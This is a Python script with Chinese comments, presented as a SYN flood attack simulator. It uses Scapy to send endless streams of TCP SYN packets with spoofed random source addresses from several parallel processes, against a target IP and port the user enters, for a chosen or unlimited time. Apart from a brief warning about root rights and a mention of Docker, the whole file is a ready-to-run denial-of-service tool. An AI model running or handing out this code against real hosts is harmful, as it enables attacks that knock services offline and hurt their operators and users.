import random
import time
import os
from multiprocessing import Process, cpu_count
from scapy.all import IP, TCP, send

# ==============================================================================
# 核心功能模块
# ==============================================================================

def get_user_input(prompt, default_value, value_type=str):
    """
    一个通用的函数，用于获取用户输入，并提供默认值和类型转换。
    """
    while True:
        user_input = input(f"{prompt} (默认为: {default_value}): ").strip()
        if not user_input:
            return default_value
        try:
            return value_type(user_input)
        except ValueError:
            print(f"输入无效，请输入一个有效的 {value_type.__name__} 类型的值。")

def flood_worker(target_ip, target_port):
    """
    攻击工作单元，在独立的进程中运行。
    它会伪造源IP和源端口，并持续发送SYN包。
    """
    print(f"进程 {os.getpid()} 已启动，开始向 {target_ip}:{target_port} 发送SYN包...")
    
    while True:
        try:
            # 伪造一个随机的源IP地址，使服务器无法将SYN-ACK包发回
            src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            # 伪造一个随机的源端口
            src_port = random.randint(1024, 65535)
            
            # 使用Scapy构造一个TCP SYN包
            # IP层：指定伪造的源IP和目标IP
            # TCP层：指定伪造的源端口、目标端口，并将标志位(flags)设为"S" (SYN)
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            
            # 发送数据包，verbose=0表示不打印发送确认信息，以提高性能
            send(packet, verbose=0)
        except Exception:
            # 在高负载下可能会出错，忽略并继续
            pass

# ==============================================================================
# 主程序入口
# ==============================================================================

if __name__ == "__main__":
    print("--- SYN 洪水攻击模拟器 (交互模式) ---")
    print("此工具通过发送大量伪造源的TCP SYN包，耗尽目标的连接状态表。")
    print("警告：此脚本需要root权限才能伪造IP地址。在Docker容器内通常已满足。")
    print("-" * 40)

    # 1. 获取用户输入的参数
    target_ip = get_user_input("请输入目标IP地址", "target")
    target_port = get_user_input("请输入目标端口", 80, int)
    process_count = get_user_input("请输入要启动的攻击进程数", cpu_count(), int)
    duration = get_user_input("请输入攻击持续时间 (秒, 0为无限)", 60, int)

    print("-" * 40)
    print("攻击参数确认:")
    print(f"  - 目标: {target_ip}:{target_port}")
    print(f"  - 进程数: {process_count}")
    print(f"  - 持续时间: {'无限' if duration == 0 else f'{duration} 秒'}")
    print("-" * 40)

    confirm = input("确认开始攻击? (y/n): ").lower()
    if confirm != 'y':
        print("攻击已取消。")
        exit()

    # 2. 启动攻击进程
    processes = []
    print(f"正在启动 {process_count} 个攻击进程...")
    for _ in range(process_count):
        p = Process(target=flood_worker, args=(target_ip, target_port))
        p.start()
        processes.append(p)

    # 3. 管理攻击时长并结束
    try:
        if duration > 0:
            print(f"攻击将持续 {duration} 秒... 按 Ctrl+C 可提前终止。")
            time.sleep(duration)
        else:
            print("攻击已开始，将无限期运行... 按 Ctrl+C 终止。")
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n检测到手动中断...")
    finally:
        print("正在停止所有攻击进程...")
        for p in processes:
            p.terminate()
            p.join()
        print("所有攻击进程已停止。程序退出。")

